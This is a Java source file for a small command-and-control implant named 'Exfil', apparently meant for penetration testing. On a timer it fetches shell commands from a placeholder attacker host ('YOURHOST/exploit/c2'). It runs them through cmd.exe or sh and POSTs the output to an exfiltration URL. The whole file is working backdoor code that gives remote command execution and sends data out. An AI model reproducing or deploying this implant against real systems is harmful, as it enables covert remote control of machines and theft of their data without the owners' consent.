import java.lang.ProcessBuilder;
import java.lang.Process;
import javax.net.ssl.HttpsURLConnection;
import java.io.*;
import java.net.*;
import java.util.*;
	
public class Exfil{
	public long delay = 10 * 1000; // delay in milliseconds
	LoopTask task = new LoopTask();
	Timer timer = new Timer("TaskName");
	String exe = System.getProperty("os.name").toLowerCase().contains("windows") ? "cmd.exe" : "sh";
	String swtch = System.getProperty("os.name").toLowerCase().contains("windows") ? "/C" : "-c";
	public String url = "https://YOURHOST_OR_BURPCOLLABORATOR/Exfil";
	public String clearcheck = "https://YOURHOST/exploit/c2/2c.php?get=1";
	public String cmdcheck = "https://YOURHOST/exploit/c2/c2.txt";
	
	private void clearCommand(){
			try{
			HttpsURLConnection httpClient = (HttpsURLConnection) new URL(clearcheck).openConnection();
			httpClient.setRequestMethod("GET");
			httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
			int responseCode = httpClient.getResponseCode();
			try (BufferedReader in = new BufferedReader(
					new InputStreamReader(httpClient.getInputStream()))) {
				StringBuilder response = new StringBuilder();
				String line;
				while ((line = in.readLine()) != null) {
					response.append(line);
				}
			}			
		}
		catch (IOException e){ e.printStackTrace();
		}
		finally{
		}
	}
	
	public String getCommand(){
		try{
			HttpsURLConnection httpClient = (HttpsURLConnection) new URL(cmdcheck).openConnection();
			httpClient.setRequestMethod("GET");
			httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
			int responseCode = httpClient.getResponseCode();
			try (BufferedReader in = new BufferedReader(
					new InputStreamReader(httpClient.getInputStream()))) {
				StringBuilder response = new StringBuilder();
				String line;
				while ((line = in.readLine()) != null) {
					response.append(line);
				}
				String cmd = response.toString();
				if (cmd == null || cmd.isEmpty()){
					return "";
				}
				else{System.out.println("getcmd: " + cmd);
					clearCommand();
					return cmd;
				}
			}			
		}
		catch (IOException e){ e.printStackTrace();
		}
		finally{
		}
		return "";
	}
	
	public void start(){
			timer.cancel();
			timer = new Timer("TaskName");
			Date executionDate = new Date();
			timer.scheduleAtFixedRate(task, executionDate, delay);
	}
	
	public static void main(String[] args){    
			Exfil xf = new Exfil();
			if (args.length==4){				 
				xf.url = args[0];
				xf.clearcheck = args[1];
				xf.cmdcheck = args[2];
				xf.delay = Long.parseLong(args[3]) * 1000;
			}
			xf.start();
	} 
	
	public class LoopTask extends TimerTask{
		public void run(){
				String cmd = getCommand();
				if (cmd == null || cmd.isEmpty()){
					//System.out.println("nothing");
				}
				else{							
					try {
						clearCommand();
						ProcessBuilder builder = new ProcessBuilder();
						builder.command(exe,swtch,cmd); 
						Process p = builder.start();BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
						String line; StringBuilder sb = new StringBuilder();
						while((line=br.readLine())!=null) 
							sb.append(line + System.lineSeparator());
						String content=sb.toString();
						HttpsURLConnection httpClient = (HttpsURLConnection) new URL(url).openConnection();
						httpClient.setRequestMethod("POST");
						httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
						httpClient.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
						String urlParameters = "data="+URLEncoder.encode(content,java.nio.charset.StandardCharsets.UTF_8.toString());
						httpClient.setDoOutput(true);
						try (DataOutputStream wr = new DataOutputStream(httpClient.getOutputStream())) {
							wr.writeBytes(urlParameters);
							wr.flush();
						}
						int responseCode = httpClient.getResponseCode();
						System.out.println("Response Code: " + responseCode);
						try (BufferedReader in = new BufferedReader(
								new InputStreamReader(httpClient.getInputStream()))) {
							String xline;
							StringBuilder response = new StringBuilder();
							while ((xline = in.readLine()) != null) {
								response.append(xline);
								}
							}
						}
						catch (IOException e) { e.printStackTrace();
						}
						finally{
						}
					}
			}
	}
} 
